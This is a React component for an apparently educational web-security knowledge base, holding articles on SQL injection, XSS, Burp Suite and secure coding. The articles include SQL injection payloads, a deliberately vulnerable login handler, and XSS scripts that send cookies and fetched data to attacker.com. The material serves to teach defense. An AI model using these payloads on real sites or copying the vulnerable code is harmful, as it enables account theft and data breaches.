import React, { useState, useEffect } from 'react';
import { MagnifyingGlassIcon, BookOpenIcon, CodeBracketIcon, ExclamationTriangleIcon, LightBulbIcon } from '@heroicons/react/24/outline';
import { CodeBlock } from '../security-lab/CodeBlock';

interface KnowledgeArticle {
  id: string;
  title: string;
  category: 'vulnerability' | 'tool' | 'concept' | 'tutorial' | 'reference';
  tags: string[];
  difficulty: 'beginner' | 'intermediate' | 'advanced';
  readTime: number; // minutes
  lastUpdated: Date;
  content: string;
  codeExamples?: {
    title: string;
    code: string;
    language: string;
    description: string;
  }[];
  relatedArticles: string[];
}

interface KnowledgeBaseProps {
  onArticleRead?: (articleId: string) => void;
}

export const KnowledgeBase: React.FC<KnowledgeBaseProps> = ({ onArticleRead }) => {
  const [articles, setArticles] = useState<KnowledgeArticle[]>([]);
  const [selectedArticle, setSelectedArticle] = useState<KnowledgeArticle | null>(null);
  const [searchQuery, setSearchQuery] = useState('');
  const [selectedCategory, setSelectedCategory] = useState<string>('all');
  const [filteredArticles, setFilteredArticles] = useState<KnowledgeArticle[]>([]);

  // Initialize knowledge base articles
  useEffect(() => {
    const knowledgeArticles: KnowledgeArticle[] = [
      {
        id: 'sql-injection-complete-guide',
        title: 'Complete Guide to SQL Injection',
        category: 'vulnerability',
        tags: ['sql', 'injection', 'database', 'security'],
        difficulty: 'intermediate',
        readTime: 15,
        lastUpdated: new Date('2024-01-15'),
        relatedArticles: ['parameterized-queries', 'database-security'],
        content: `# Complete Guide to SQL Injection

## What is SQL Injection?

SQL Injection is a code injection technique that exploits security vulnerabilities in an application's database layer. It occurs when user input is incorrectly filtered for string literal escape characters embedded in SQL statements or user input is not strongly typed and unexpectedly executed.

## Types of SQL Injection

### 1. In-band SQL Injection
The most common and easy-to-exploit type where the attacker uses the same communication channel to launch the attack and gather results.

**Union-based SQL Injection:**
- Uses the UNION SQL operator to combine results from multiple SELECT statements
- Requires knowledge of the number of columns in the original query

**Error-based SQL Injection:**
- Relies on error messages thrown by the database server
- Provides information about the database structure

### 2. Inferential (Blind) SQL Injection
No data is transferred via the web application, but the attacker can reconstruct the information by observing the behavior of the application.

**Boolean-based Blind SQL Injection:**
- Sends SQL queries that force the application to return different results depending on whether the query is true or false

**Time-based Blind SQL Injection:**
- Sends SQL queries that force the database to wait for a specified amount of time before responding

### 3. Out-of-band SQL Injection
Occurs when the attacker can't use the same channel to launch the attack and gather information, or when a server is too slow or unstable to perform these actions.

## Common Attack Vectors

### Authentication Bypass
\`\`\`sql
-- Original query
SELECT * FROM users WHERE username = 'admin' AND password = 'password123'

-- Malicious input for username: admin' --
SELECT * FROM users WHERE username = 'admin' --' AND password = 'password123'
\`\`\`

### Data Extraction
\`\`\`sql
-- Original query
SELECT title, content FROM articles WHERE id = 1

-- Malicious input: 1 UNION SELECT username, password FROM users
SELECT title, content FROM articles WHERE id = 1 UNION SELECT username, password FROM users
\`\`\`

### Database Enumeration
\`\`\`sql
-- Get database version
1' AND (SELECT SUBSTRING(@@version,1,1))='5' --

-- Get table names
1' UNION SELECT table_name, NULL FROM information_schema.tables --

-- Get column names
1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --
\`\`\`

## Prevention Techniques

### 1. Parameterized Queries (Prepared Statements)
The most effective defense against SQL injection.

### 2. Input Validation
Validate all user input against a whitelist of acceptable values.

### 3. Escape All User Input
Properly escape special characters in user input.

### 4. Least Privilege Principle
Use database accounts with minimal necessary privileges.

### 5. Regular Security Testing
Implement automated and manual security testing in your development lifecycle.

## Real-world Impact

SQL injection can lead to:
- **Data Breach:** Unauthorized access to sensitive information
- **Data Manipulation:** Modification or deletion of critical data
- **Authentication Bypass:** Gaining unauthorized access to systems
- **Denial of Service:** Making the application unavailable
- **Remote Code Execution:** In some cases, executing system commands

## Detection and Testing

### Manual Testing
1. Test input fields with special characters: ' " ; --
2. Try boolean-based payloads: ' OR '1'='1
3. Test for error messages that reveal database information
4. Use time-based payloads: '; WAITFOR DELAY '00:00:05' --

### Automated Tools
- **SQLMap:** Automated SQL injection testing tool
- **Burp Suite:** Web application security testing platform
- **OWASP ZAP:** Free security testing proxy

## Conclusion

SQL injection remains one of the most critical web application vulnerabilities. Understanding how these attacks work and implementing proper defenses is crucial for any web developer or security professional.`,
        codeExamples: [
          {
            title: 'Vulnerable Code Example',
            language: 'javascript',
            description: 'This code is vulnerable to SQL injection due to string concatenation',
            code: `// VULNERABLE CODE - DO NOT USE
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  // Direct string concatenation - DANGEROUS!
  const query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
  
  db.query(query, (err, results) => {
    if (results.length > 0) {
      res.json({ success: true, user: results[0] });
    } else {
      res.json({ success: false, message: 'Invalid credentials' });
    }
  });
});`
          },
          {
            title: 'Secure Code Example',
            language: 'javascript',
            description: 'This code uses parameterized queries to prevent SQL injection',
            code: `// SECURE CODE - RECOMMENDED APPROACH
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  // Input validation
  if (!username || !password || username.length > 50 || password.length > 100) {
    return res.status(400).json({ error: 'Invalid input' });
  }
  
  // Parameterized query - SAFE
  const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
  
  db.query(query, [username, password], (err, results) => {
    if (err) {
      console.error('Database error:', err);
      return res.status(500).json({ error: 'Internal server error' });
    }
    
    if (results.length > 0) {
      res.json({ success: true, user: { id: results[0].id, username: results[0].username } });
    } else {
      res.json({ success: false, message: 'Invalid credentials' });
    }
  });
});`
          }
        ]
      },
      {
        id: 'xss-prevention-guide',
        title: 'XSS Prevention: Complete Developer Guide',
        category: 'vulnerability',
        tags: ['xss', 'javascript', 'frontend', 'security'],
        difficulty: 'intermediate',
        readTime: 12,
        lastUpdated: new Date('2024-01-10'),
        relatedArticles: ['content-security-policy', 'input-sanitization'],
        content: `# XSS Prevention: Complete Developer Guide

## Understanding Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. These scripts execute in the victim's browser with the same privileges as legitimate scripts from the website.

## Types of XSS Attacks

### 1. Reflected XSS (Non-Persistent)
The malicious script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request.

### 2. Stored XSS (Persistent)
The malicious script is permanently stored on the target servers, such as in a database, message forum, visitor log, comment field, etc.

### 3. DOM-based XSS
The vulnerability exists in client-side code rather than server-side code. The attack payload is executed as a result of modifying the DOM environment in the victim's browser.

## Common Attack Scenarios

### Basic Script Injection
\`\`\`html
<script>alert('XSS')</script>
\`\`\`

### Cookie Theft
\`\`\`html
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>
\`\`\`

### Session Hijacking
\`\`\`html
<script>
fetch('/api/sensitive-data', {
  method: 'GET',
  credentials: 'include'
}).then(response => response.json())
.then(data => {
  fetch('http://attacker.com/exfiltrate', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
\`\`\`

## Prevention Techniques

### 1. Output Encoding/Escaping
Always encode user data when outputting it to the browser.

### 2. Input Validation
Validate all user input against expected formats and reject anything that doesn't match.

### 3. Content Security Policy (CSP)
Implement CSP headers to control which resources the browser is allowed to load.

### 4. Use Safe APIs
Avoid using dangerous APIs like innerHTML, document.write, and eval().

### 5. Sanitize HTML Content
If you must allow HTML input, use a trusted sanitization library.

## Framework-Specific Prevention

### React
React automatically escapes values embedded in JSX, but be careful with dangerouslySetInnerHTML.

### Angular
Angular sanitizes values by default, but be cautious with bypassSecurityTrust methods.

### Vue.js
Vue.js escapes interpolated content by default, but v-html directive can be dangerous.

## Testing for XSS

### Manual Testing
1. Try basic payloads: <script>alert('XSS')</script>
2. Test different contexts: HTML, attributes, JavaScript, CSS
3. Try encoding bypasses: &lt;script&gt;, %3Cscript%3E
4. Test filter bypasses: <img src=x onerror=alert('XSS')>

### Automated Testing
- Use tools like Burp Suite, OWASP ZAP, or XSStrike
- Implement automated security testing in CI/CD pipelines

## Conclusion

XSS prevention requires a multi-layered approach combining proper output encoding, input validation, CSP implementation, and regular security testing.`,
        codeExamples: [
          {
            title: 'Vulnerable React Component',
            language: 'jsx',
            description: 'This React component is vulnerable to XSS attacks',
            code: `// VULNERABLE - DO NOT USE
const CommentDisplay = ({ comment }) => {
  return (
    <div className="comment">
      {/* DANGEROUS: Raw HTML rendering */}
      <div dangerouslySetInnerHTML={{__html: comment.content}} />
      <div className="author">By: {comment.author}</div>
    </div>
  );
};`
          },
          {
            title: 'Secure React Component',
            language: 'jsx',
            description: 'This component properly handles user content to prevent XSS',
            code: `// SECURE - RECOMMENDED
import DOMPurify from 'dompurify';

const CommentDisplay = ({ comment }) => {
  // Option 1: Display as plain text (safest)
  const displayAsText = (content) => {
    return <div>{content}</div>; // React automatically escapes
  };
  
  // Option 2: Sanitize HTML if rich content is needed
  const displayAsHTML = (content) => {
    const sanitized = DOMPurify.sanitize(content, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
      ALLOWED_ATTR: []
    });
    return <div dangerouslySetInnerHTML={{__html: sanitized}} />;
  };
  
  return (
    <div className="comment">
      {comment.isRichText ? 
        displayAsHTML(comment.content) : 
        displayAsText(comment.content)
      }
      <div className="author">By: {comment.author}</div>
    </div>
  );
};`
          }
        ]
      },
      {
        id: 'burp-suite-guide',
        title: 'Burp Suite Professional Guide',
        category: 'tool',
        tags: ['burp-suite', 'testing', 'proxy', 'scanner'],
        difficulty: 'intermediate',
        readTime: 20,
        lastUpdated: new Date('2024-01-05'),
        relatedArticles: ['web-app-testing', 'proxy-configuration'],
        content: `# Burp Suite Professional Guide

## Introduction to Burp Suite

Burp Suite is an integrated platform for performing security testing of web applications. It contains various tools that work together to support the entire testing process, from initial mapping and analysis of an application's attack surface to finding and exploiting security vulnerabilities.

## Key Components

### 1. Proxy
The heart of Burp Suite - intercepts HTTP/S traffic between your browser and the target application.

**Key Features:**
- Traffic interception and modification
- SSL/TLS certificate generation
- Request/response history
- Match and replace rules

### 2. Scanner
Automated vulnerability scanner that can identify various security issues.

**Scan Types:**
- Passive scanning (analyzes traffic without sending additional requests)
- Active scanning (sends crafted requests to identify vulnerabilities)
- Live scanning (scans traffic as it passes through the proxy)

### 3. Intruder
Automated attack tool for customized attacks against web applications.

**Attack Types:**
- Sniper: Single payload set, single insertion point
- Battering ram: Single payload set, multiple insertion points
- Pitchfork: Multiple payload sets, parallel iteration
- Cluster bomb: Multiple payload sets, all combinations

### 4. Repeater
Manual request manipulation and testing tool.

**Use Cases:**
- Modify and resend individual requests
- Test parameter manipulation
- Analyze responses for vulnerabilities

### 5. Sequencer
Analyzes the randomness of session tokens and other important data items.

### 6. Decoder
Utility for encoding and decoding data in various formats.

### 7. Comparer
Visual diff tool for comparing any two pieces of data.

## Getting Started

### 1. Proxy Configuration
Configure your browser to use Burp as a proxy (default: 127.0.0.1:8080).

### 2. SSL Certificate Installation
Install Burp's CA certificate in your browser to intercept HTTPS traffic.

### 3. Target Scope Definition
Define your target scope to focus testing on specific domains/URLs.

## Common Testing Workflows

### 1. Manual Testing Workflow
1. Configure proxy and browse the application
2. Review proxy history for interesting requests
3. Send requests to Repeater for manual testing
4. Use Intruder for automated parameter fuzzing
5. Analyze results and document findings

### 2. Automated Scanning Workflow
1. Spider the application to discover content
2. Configure scan settings and scope
3. Run automated scan
4. Review scan results and validate findings
5. Perform manual verification of identified issues

## Advanced Features

### Extensions
Burp Suite supports extensions written in Java, Python, and Ruby.

**Popular Extensions:**
- Logger++: Advanced logging and searching
- Autorize: Authorization testing
- Param Miner: Parameter discovery
- Turbo Intruder: High-speed request sending

### Collaborator
Burp Collaborator is a service that helps detect vulnerabilities that trigger out-of-band interactions.

**Use Cases:**
- Blind SQL injection detection
- SSRF vulnerability identification
- XXE attack detection

## Best Practices

### 1. Scope Management
- Always define a clear scope before testing
- Use scope to avoid testing out-of-scope targets
- Regularly review and update scope as needed

### 2. Session Management
- Save your work regularly using project files
- Use different projects for different targets
- Backup important findings and configurations

### 3. Performance Optimization
- Adjust thread counts based on target capacity
- Use appropriate delays between requests
- Monitor target application performance during testing

### 4. Reporting
- Document all findings with clear evidence
- Include request/response details for reproduction
- Provide clear remediation recommendations

## Integration with Other Tools

### Command Line Integration
Use Burp Suite's REST API for automation and integration.

### CI/CD Integration
Integrate Burp Scanner into continuous integration pipelines.

### Collaboration
Share findings and configurations with team members using Burp's collaboration features.

## Conclusion

Burp Suite is a powerful platform that can significantly enhance your web application security testing capabilities. Mastering its various components and workflows is essential for effective security testing.`,
        codeExamples: [
          {
            title: 'Burp Extension Example',
            language: 'python',
            description: 'Simple Burp extension to highlight interesting responses',
            code: `from burp import IBurpExtender, IHttpListener, ITab
from java.awt import Component
from javax.swing import JPanel, JLabel

class BurpExtender(IBurpExtender, IHttpListener, ITab):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        
        # Set extension name
        callbacks.setExtensionName("Response Highlighter")
        
        # Register HTTP listener
        callbacks.registerHttpListener(self)
        
        # Create UI
        self._panel = JPanel()
        self._panel.add(JLabel("Response Highlighter Extension"))
        
        # Add tab to Burp UI
        callbacks.addSuiteTab(self)
        
        print("Response Highlighter extension loaded")
    
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        # Only process responses
        if messageIsRequest:
            return
            
        # Get response
        response = messageInfo.getResponse()
        if response is None:
            return
            
        # Analyze response
        responseString = self._helpers.bytesToString(response)
        
        # Highlight responses containing interesting keywords
        interesting_keywords = ['error', 'exception', 'debug', 'admin', 'password']
        
        for keyword in interesting_keywords:
            if keyword.lower() in responseString.lower():
                messageInfo.setHighlight('red')
                messageInfo.setComment(f'Contains keyword: {keyword}')
                break
    
    def getTabCaption(self):
        return "Response Highlighter"
    
    def getUiComponent(self):
        return self._panel`
          }
        ]
      },
      {
        id: 'secure-coding-practices',
        title: 'Secure Coding Practices for Web Applications',
        category: 'concept',
        tags: ['secure-coding', 'best-practices', 'development'],
        difficulty: 'intermediate',
        readTime: 18,
        lastUpdated: new Date('2024-01-12'),
        relatedArticles: ['input-validation', 'authentication-security'],
        content: `# Secure Coding Practices for Web Applications

## Introduction

Secure coding is the practice of developing computer software in a way that guards against the accidental introduction of security vulnerabilities. This guide covers essential secure coding practices for web application development.

## Core Principles

### 1. Defense in Depth
Implement multiple layers of security controls rather than relying on a single defense mechanism.

### 2. Principle of Least Privilege
Grant users and processes only the minimum access rights needed to perform their functions.

### 3. Fail Securely
Ensure that when systems fail, they fail in a secure state rather than an insecure one.

### 4. Security by Design
Incorporate security considerations from the earliest stages of development.

## Input Validation and Sanitization

### Validate All Input
- Validate on both client and server sides
- Use whitelist validation when possible
- Reject invalid input rather than attempting to sanitize it
- Validate data type, length, format, and range

### Sanitization Techniques
- HTML encoding for output to HTML context
- URL encoding for output to URL context
- JavaScript encoding for output to JavaScript context
- SQL parameterization for database queries

## Authentication and Session Management

### Strong Authentication
- Implement multi-factor authentication where possible
- Use strong password policies
- Implement account lockout mechanisms
- Use secure password storage (bcrypt, scrypt, or Argon2)

### Secure Session Management
- Generate cryptographically strong session IDs
- Use secure, httpOnly, and sameSite cookie flags
- Implement proper session timeout
- Regenerate session IDs after authentication

## Authorization and Access Control

### Implement Proper Authorization
- Check authorization for every request
- Use role-based or attribute-based access control
- Implement proper resource-level authorization
- Avoid relying on client-side access controls

### Prevent Privilege Escalation
- Validate user permissions for each action
- Implement proper separation of duties
- Use the principle of least privilege consistently

## Data Protection

### Encryption
- Use HTTPS for all communications
- Encrypt sensitive data at rest
- Use strong encryption algorithms (AES-256, RSA-2048+)
- Implement proper key management

### Data Handling
- Minimize data collection and retention
- Implement secure data disposal
- Use data classification schemes
- Implement proper backup security

## Error Handling and Logging

### Secure Error Handling
- Don't expose sensitive information in error messages
- Log security-relevant events
- Implement centralized error handling
- Use generic error messages for users

### Security Logging
- Log authentication attempts
- Log authorization failures
- Log data access and modifications
- Implement log integrity protection

## API Security

### RESTful API Security
- Use proper HTTP methods
- Implement rate limiting
- Use API versioning
- Validate all API inputs

### Authentication for APIs
- Use OAuth 2.0 or JWT tokens
- Implement proper token validation
- Use short-lived access tokens
- Implement token refresh mechanisms

## Database Security

### SQL Injection Prevention
- Use parameterized queries exclusively
- Implement proper input validation
- Use stored procedures when appropriate
- Apply principle of least privilege to database accounts

### Database Configuration
- Remove default accounts and passwords
- Encrypt database connections
- Implement database activity monitoring
- Regular security updates and patches

## File Upload Security

### Secure File Handling
- Validate file types and extensions
- Scan uploaded files for malware
- Store files outside web root
- Implement file size limits

### File Access Controls
- Use indirect object references
- Implement proper access controls
- Validate file paths to prevent directory traversal
- Use content-type validation

## Security Headers

### Essential Security Headers
- Content-Security-Policy (CSP)
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security (HSTS)
- X-XSS-Protection

## Code Review and Testing

### Security Code Review
- Implement peer code reviews
- Use static analysis tools
- Focus on security-critical components
- Document security decisions

### Security Testing
- Implement unit tests for security functions
- Perform integration security testing
- Use dynamic application security testing (DAST)
- Conduct regular penetration testing

## Dependency Management

### Third-Party Components
- Maintain inventory of all dependencies
- Regularly update dependencies
- Monitor for security vulnerabilities
- Use dependency scanning tools

### Supply Chain Security
- Verify integrity of downloaded components
- Use trusted repositories
- Implement software composition analysis
- Monitor for compromised dependencies

## Deployment Security

### Secure Configuration
- Remove debug code and comments
- Disable unnecessary services and features
- Use secure default configurations
- Implement proper environment separation

### Infrastructure Security
- Use infrastructure as code
- Implement proper network segmentation
- Use container security best practices
- Regular security patching

## Conclusion

Secure coding is an ongoing process that requires continuous learning and adaptation. By following these practices and staying updated with the latest security threats and mitigation techniques, developers can significantly reduce the risk of security vulnerabilities in their applications.`
      }
    ];

    setArticles(knowledgeArticles);
    setFilteredArticles(knowledgeArticles);
  }, []);

  // Filter articles based on search and category
  useEffect(() => {
    let filtered = articles;

    // Filter by category
    if (selectedCategory !== 'all') {
      filtered = filtered.filter(article => article.category === selectedCategory);
    }

    // Filter by search query
    if (searchQuery) {
      const query = searchQuery.toLowerCase();
      filtered = filtered.filter(article =>
        article.title.toLowerCase().includes(query) ||
        article.content.toLowerCase().includes(query) ||
        article.tags.some(tag => tag.toLowerCase().includes(query))
      );
    }

    setFilteredArticles(filtered);
  }, [articles, searchQuery, selectedCategory]);

  const handleArticleSelect = (article: KnowledgeArticle) => {
    setSelectedArticle(article);
    if (onArticleRead) {
      onArticleRead(article.id);
    }
  };

  const getCategoryIcon = (category: string) => {
    switch (category) {
      case 'vulnerability': return ExclamationTriangleIcon;
      case 'tool': return CodeBracketIcon;
      case 'concept': return LightBulbIcon;
      case 'tutorial': return BookOpenIcon;
      case 'reference': return BookOpenIcon;
      default: return BookOpenIcon;
    }
  };

  const getDifficultyColor = (difficulty: string) => {
    switch (difficulty) {
      case 'beginner': return 'text-green-600 bg-green-100';
      case 'intermediate': return 'text-yellow-600 bg-yellow-100';
      case 'advanced': return 'text-red-600 bg-red-100';
      default: return 'text-gray-600 bg-gray-100';
    }
  };

  const categories = [
    { id: 'all', name: 'All Articles' },
    { id: 'vulnerability', name: 'Vulnerabilities' },
    { id: 'tool', name: 'Tools' },
    { id: 'concept', name: 'Concepts' },
    { id: 'tutorial', name: 'Tutorials' },
    { id: 'reference', name: 'Reference' }
  ];

  // Article Detail View
  if (selectedArticle) {
    return (
      <div className="max-w-4xl mx-auto">
        <div className="mb-6">
          <button
            onClick={() => setSelectedArticle(null)}
            className="text-blue-600 hover:text-blue-800 mb-4"
          >
            ← Back to Knowledge Base
          </button>
          
          <div className="bg-white rounded-lg shadow-lg p-8">
            {/* Article Header */}
            <div className="mb-6">
              <div className="flex items-center space-x-3 mb-4">
                <span className={`inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium ${getDifficultyColor(selectedArticle.difficulty)}`}>
                  {selectedArticle.difficulty}
                </span>
                <span className="text-sm text-gray-500">
                  {selectedArticle.readTime} min read
                </span>
                <span className="text-sm text-gray-500">
                  Updated {selectedArticle.lastUpdated.toLocaleDateString()}
                </span>
              </div>
              
              <h1 className="text-3xl font-bold text-gray-900 mb-4">
                {selectedArticle.title}
              </h1>
              
              <div className="flex flex-wrap gap-2 mb-6">
                {selectedArticle.tags.map((tag) => (
                  <span
                    key={tag}
                    className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-blue-100 text-blue-800"
                  >
                    {tag}
                  </span>
                ))}
              </div>
            </div>

            {/* Article Content */}
            <div className="prose max-w-none mb-8">
              <div className="whitespace-pre-wrap text-gray-700 leading-relaxed">
                {selectedArticle.content}
              </div>
            </div>

            {/* Code Examples */}
            {selectedArticle.codeExamples && selectedArticle.codeExamples.length > 0 && (
              <div className="mb-8">
                <h2 className="text-xl font-semibold text-gray-900 mb-4">Code Examples</h2>
                <div className="space-y-6">
                  {selectedArticle.codeExamples.map((example, index) => (
                    <div key={index} className="border border-gray-200 rounded-lg p-4">
                      <h3 className="text-lg font-medium text-gray-900 mb-2">
                        {example.title}
                      </h3>
                      <p className="text-gray-600 mb-4">{example.description}</p>
                      <CodeBlock
                        code={example.code}
                        language={example.language}
                        showLineNumbers={true}
                      />
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Related Articles */}
            {selectedArticle.relatedArticles.length > 0 && (
              <div className="border-t border-gray-200 pt-6">
                <h2 className="text-xl font-semibold text-gray-900 mb-4">Related Articles</h2>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {selectedArticle.relatedArticles.map((relatedId) => {
                    const relatedArticle = articles.find(a => a.id === relatedId);
                    if (!relatedArticle) return null;
                    
                    return (
                      <div
                        key={relatedId}
                        onClick={() => handleArticleSelect(relatedArticle)}
                        className="border border-gray-200 rounded-lg p-4 hover:shadow-md transition-shadow cursor-pointer"
                      >
                        <h3 className="font-medium text-gray-900 mb-1">
                          {relatedArticle.title}
                        </h3>
                        <p className="text-sm text-gray-600">
                          {relatedArticle.readTime} min read
                        </p>
                      </div>
                    );
                  })}
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
    );
  }

  // Knowledge Base List View
  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="text-center">
        <h2 className="text-2xl font-bold text-gray-900 mb-2">Knowledge Base</h2>
        <p className="text-gray-600">
          Comprehensive documentation and guides for web application security
        </p>
      </div>

      {/* Search and Filters */}
      <div className="bg-white rounded-lg shadow p-6">
        <div className="flex flex-col md:flex-row gap-4">
          {/* Search */}
          <div className="flex-1 relative">
            <MagnifyingGlassIcon className="h-5 w-5 absolute left-3 top-3 text-gray-400" />
            <input
              type="text"
              placeholder="Search articles..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className="w-full pl-10 pr-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
            />
          </div>
          
          {/* Category Filter */}
          <div className="md:w-48">
            <select
              value={selectedCategory}
              onChange={(e) => setSelectedCategory(e.target.value)}
              className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
            >
              {categories.map((category) => (
                <option key={category.id} value={category.id}>
                  {category.name}
                </option>
              ))}
            </select>
          </div>
        </div>
      </div>

      {/* Articles Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
        {filteredArticles.map((article) => {
          const IconComponent = getCategoryIcon(article.category);
          
          return (
            <div
              key={article.id}
              onClick={() => handleArticleSelect(article)}
              className="bg-white border border-gray-200 rounded-lg p-6 hover:shadow-md transition-shadow cursor-pointer"
            >
              <div className="flex items-start space-x-3 mb-4">
                <div className="flex-shrink-0">
                  <IconComponent className="h-6 w-6 text-blue-600" />
                </div>
                <div className="flex-1">
                  <h3 className="text-lg font-semibold text-gray-900 mb-2">
                    {article.title}
                  </h3>
                  <div className="flex items-center space-x-2 mb-3">
                    <span className={`inline-flex items-center px-2 py-0.5 rounded-full text-xs font-medium ${getDifficultyColor(article.difficulty)}`}>
                      {article.difficulty}
                    </span>
                    <span className="text-xs text-gray-500">
                      {article.readTime} min read
                    </span>
                  </div>
                </div>
              </div>
              
              <div className="flex flex-wrap gap-1 mb-4">
                {article.tags.slice(0, 3).map((tag) => (
                  <span
                    key={tag}
                    className="inline-flex items-center px-2 py-0.5 rounded-full text-xs bg-gray-100 text-gray-700"
                  >
                    {tag}
                  </span>
                ))}
                {article.tags.length > 3 && (
                  <span className="inline-flex items-center px-2 py-0.5 rounded-full text-xs bg-gray-100 text-gray-700">
                    +{article.tags.length - 3}
                  </span>
                )}
              </div>
              
              <div className="text-sm text-gray-500">
                Updated {article.lastUpdated.toLocaleDateString()}
              </div>
            </div>
          );
        })}
      </div>

      {filteredArticles.length === 0 && (
        <div className="text-center py-12">
          <BookOpenIcon className="h-12 w-12 mx-auto text-gray-300 mb-4" />
          <h3 className="text-lg font-medium text-gray-900 mb-2">No articles found</h3>
          <p className="text-gray-600">
            Try adjusting your search terms or category filter.
          </p>
        </div>
      )}
    </div>
  );
};